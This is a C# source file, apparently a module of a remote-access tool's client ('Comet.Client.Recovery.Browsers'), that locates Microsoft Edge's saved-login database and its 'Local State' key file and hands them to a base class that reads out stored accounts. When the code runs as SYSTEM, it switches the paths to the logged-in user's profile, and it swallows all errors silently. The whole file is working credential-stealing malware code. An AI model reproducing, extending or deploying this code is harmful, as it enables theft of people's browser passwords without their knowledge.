using Comet.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Comet.Client.Recovery.Browsers
{
    public class GetEdge : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Microsoft Edge";

        /// <inheritdoc />
        public override IEnumerable<SaveUser> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft\\Edge\\User Data\\Default\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft\\Edge\\User Data\\Local State");

                if (filePath.Contains("systemprofile"))
                {
                    filePath = "C:\\Users\\"+ ToolsHelpers .GetExplorerUserName()+ "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
                    localStatePath = "C:\\Users\\"+ ToolsHelpers .GetExplorerUserName()+ "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
                }
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<SaveUser>();
            }
        }
    }
}
